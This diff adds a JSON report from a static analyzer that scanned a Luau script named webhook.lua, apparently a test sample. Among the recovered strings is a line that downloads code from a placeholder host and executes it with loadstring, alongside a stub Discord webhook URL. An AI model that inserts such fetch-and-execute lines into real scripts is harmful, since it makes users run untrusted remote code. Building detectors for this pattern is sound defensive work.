@@ -1,0 +1,94 @@
+{
+  "file": "webhook.lua",
+  "size_bytes": 311,
+  "fingerprints": [
+    {
+      "id": "luau-plain",
+      "label": "Plain Luau source",
+      "score": 1,
+      "signals": [
+        "Luau statement head"
+      ]
+    }
+  ],
+  "primary_format": "luau-plain",
+  "metrics": {
+    "entropy_bits_per_byte": 5.152,
+    "b85_alphabet_density": 0.884,
+    "long_string_blocks": 0,
+    "long_string_bytes": 0,
+    "function_definitions": 0,
+    "loadstring_calls": 1,
+    "pcall_family_calls": 0,
+    "env_probes_found": 3,
+    "suspicious_globals": 0,
+    "printable_strings_sampled": 7
+  },
+  "env_probes": [
+    "game:GetService",
+    "loadstring",
+    "load"
+  ],
+  "suspicious_globals": [],
+  "network_surface": {
+    "discord-webhook": {
+      "severity": "high",
+      "matches": [
+        {
+          "value": "discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz",
+          "count": 1
+        }
+      ],
+      "total": 1
+    },
+    "http-url": {
+      "severity": "info",
+      "matches": [
+        {
+          "value": "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz",
+          "count": 1
+        },
+        {
+          "value": "https://example.com/payload.lua",
+          "count": 1
+        }
+      ],
+      "total": 2
+    },
+    "game-httpget": {
+      "severity": "info",
+      "matches": [
+        {
+          "value": "game:HttpGet",
+          "count": 1
+        }
+      ],
+      "total": 1
+    }
+  },
+  "long_string_blocks": [],
+  "strings": [
+    "-- webhook.lua ",
+    " script with network surface: discord webhook + remote load",
+    "local HttpService = game:GetService(\"HttpService\")",
+    "local url = \"https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz\"",
+    "local src = game:HttpGet(\"https://example.com/payload.lua\")",
+    "loadstring(src)()",
+    "return url"
+  ],
+  "decoded_strings": [
+    "-- webhook.lua ",
+    " script with network surface: discord webhook + remote load",
+    "local HttpService = game:GetService(\"HttpService\")",
+    "local url = \"https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz\"",
+    "local src = game:HttpGet(\"https://example.com/payload.lua\")",
+    "loadstring(src)()",
+    "return url"
+  ],
+  "limitations": [
+    "Static byte analysis only; the artifact is never executed.",
+    "String recovery is limited to escape-sequence decoding; runtime-constructed strings (string.char/concat chains) are not resolved.",
+    "Fingerprint scores are heuristic; a low score does not prove absence of obfuscation.",
+    "Network surface lists literal URLs and call sites; it does not verify reachability or intent."
+  ]
+}
